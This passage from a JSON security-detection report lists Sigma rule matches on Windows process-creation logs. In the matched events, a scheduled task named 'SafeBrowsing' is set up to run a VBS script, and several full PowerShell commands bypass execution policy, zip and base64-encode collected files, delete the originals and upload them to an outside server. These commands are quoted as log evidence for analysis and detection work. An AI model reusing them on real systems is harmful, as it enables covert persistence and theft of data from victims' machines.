                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C5B-6553-3506-000000004800}; ProcessId=7492; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=schtasks  /create /sc minute /mo 2 /tn \"SafeBrowsing\" /tr \"C:\\Users\\Public\\Libraries\\emlmanager.vbs\" /f ; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978331; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "f92451c8957e89bb4e61e68433faeb8d7c1461c3b90d06b3403c8f3d87c728b8",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Usage Of Web Request Commands And Cmdlets",
                                                                       "rule_description":  "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine",
                                                                       "rule_author":  "James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C61-6553-4506-000000004800}; ProcessId=8088; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\sys.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978337; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C64-6553-4806-000000004800}; ProcessId=4728; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7752; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\sys.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978340; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C69-6553-4A06-000000004800}; ProcessId=6776; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\tsklt.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978345; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C6B-6553-4C06-000000004800}; ProcessId=7372; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7752; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\tsklt.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978347; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C72-6553-4E06-000000004800}; ProcessId=6832; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\desk.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978354; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
